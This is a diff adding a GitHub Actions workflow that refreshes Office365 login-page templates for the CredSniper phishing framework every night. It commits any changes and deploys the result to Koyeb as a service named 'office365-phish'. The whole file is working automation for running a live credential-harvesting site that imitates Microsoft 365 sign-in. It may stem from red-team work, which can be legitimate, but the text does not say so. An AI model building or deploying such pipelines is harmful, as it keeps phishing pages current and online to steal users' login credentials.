@@ -1,0 +1,55 @@
+name: Refresh Office365 templates and deploy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 3 * * *'  # every day at 03:00 UTC
+
+jobs:
+  refresh-and-deploy:
+    runs-on: ubuntu-latest
+    env:
+      PYTHON_VERSION: '3.11'
+    steps:
+      - name: Checkout (incl. submodules)
+        uses: actions/checkout@v3
+        with:
+          submodules: true
+
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: ${{ env.PYTHON_VERSION }}
+
+      - name: Install Python dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r CredSniper/requirements.txt
+
+      - name: Refresh Office365 templates
+        run: python CredSniper/modules/office365/fetch_templates.py
+
+      - name: Commit & push updated templates (if any)
+        run: |
+          git config --global user.name  "github-actions[bot]"
+          git config --global user.email "github-actions[bot]@users.noreply.github.com"
+          if [[ -n $(git status --porcelain CredSniper/modules/office365/templates) ]]; then
+            git add CredSniper/modules/office365/templates
+            git commit -m "Auto-refresh Office365 templates"
+            git push
+          fi
+
+      - name: Install Koyeb CLI
+        run: |
+          curl -sSfL https://app.koyeb.com/static/cli/koyeb-latest-linux-amd64 -o /usr/local/bin/koyeb
+          chmod +x /usr/local/bin/koyeb
+
+      - name: Deploy latest build to Koyeb
+        env:
+          KOYEB_TOKEN: ${{ secrets.KOYEB_TOKEN }}
+        run: |
+          koyeb auth login --token "$KOYEB_TOKEN"
+          koyeb deploy . office365-phish/office365-service \
+            --archive-builder docker \
+            --archive-docker-dockerfile Dockerfile \
+            --ports 8080:http 
